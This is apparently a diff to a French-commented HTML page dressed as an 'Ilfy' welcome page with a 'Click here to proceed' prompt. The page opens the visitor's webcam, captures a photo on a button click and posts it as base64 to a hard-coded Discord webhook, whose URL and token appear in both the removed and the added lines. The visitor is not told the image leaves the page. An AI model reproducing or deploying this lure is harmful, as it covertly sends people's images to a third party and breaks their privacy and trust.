@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Proceed</title>
+    <title>Ilfy</title>
     <style>
         body {
             text-align: center;
@@ -16,13 +16,13 @@
     </style>
 </head>
 <body>
-    <h1>Bienvenue</h1>
-    <p>Welcome</p>
+    <h1>Welcome</h1>
+    <p>Click here to proceed:</p>
     <video id="video" autoplay playsinline></video>
     <button id="capture">Prendre une photo</button>
     <canvas id="canvas" style="display: none;"></canvas>
     <p id="result"></p>
-
+    
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -36,22 +36,34 @@
                 video.srcObject = stream;
             })
             .catch((error) => {
-                result.textContent = "Welcome to ILFY Website";
+                result.textContent = "Impossible d'accéder à la caméra. Vérifiez vos paramètres.";
                 console.error("Erreur :", error);
             });
 
-        // Fonction pour envoyer l'image au webhook Discord
-        function sendToDiscord(imageData) {
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1311321718358409226/CdCl8qZ1ptJaTSy2neLj7v92e7hV2HITlKJb8MArSQc0gzwfnPyhhjL5897CwjjEMJsN'; // Remplace par ton URL de webhook
+        // Capturer une image lorsqu'on clique sur le bouton
+        captureButton.addEventListener('click', () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convertir l'image capturée en base64
+            const imageData = canvas.toDataURL('image/png');
+            result.innerHTML = `<img src="${imageData}" alt="Photo capturée" style="max-width: 90%;">`;
+
+            // Ici, tu pourrais envoyer l'image au Webhook Discord
+            sendToWebhook(imageData);
+        });
+
+        // Fonction pour envoyer l'image au Webhook Discord
+        function sendToWebhook(imageData) {
+            const webhookUrl = "https://discordapp.com/api/webhooks/1311327193946652702/wSaWg5PyHVBVWl_6C1AXK6P1YRNB1BeEDksQvkveurqutSMwpRyCsaDdzNqgHWYrKh7t"; // Remplace par ton vrai Webhook Discord
             const payload = {
-                content: "Voici une photo capturée :",
-                embeds: [
-                    {
-                        image: {
-                            url: imageData
-                        }
+                content: "Ilfy",
+                embeds: [{
+                    image: {
+                        url: imageData
                     }
-                ]
+                }]
             };
 
             fetch(webhookUrl, {
@@ -61,34 +73,10 @@
                 },
                 body: JSON.stringify(payload)
             })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Photo envoyée avec succès');
-                } else {
-                    console.log('Erreur lors de l\'envoi de la photo');
-                }
-            })
-            .catch(error => {
-                console.error('Erreur:', error);
-            });
+            .then(response => response.json())
+            .then(data => console.log("Message envoyé !", data))
+            .catch(error => console.error("Erreur d'envoi au webhook :", error));
         }
-
-        // Capturer une image lorsqu'on clique sur le bouton
-        captureButton.addEventListener('click', () => {
-            // Définir les dimensions du canvas en fonction de la vidéo
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-
-            // Dessiner l'image vidéo sur le canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Convertir l'image capturée en base64
-            const imageData = canvas.toDataURL('image/png');
-            result.innerHTML = `<img src="${imageData}" alt="Photo capturée" style="max-width: 90%;">`;
-
-            // Envoyer l'image au webhook Discord
-            sendToDiscord(imageData);
-        });
     </script>
 </body>
 </html>
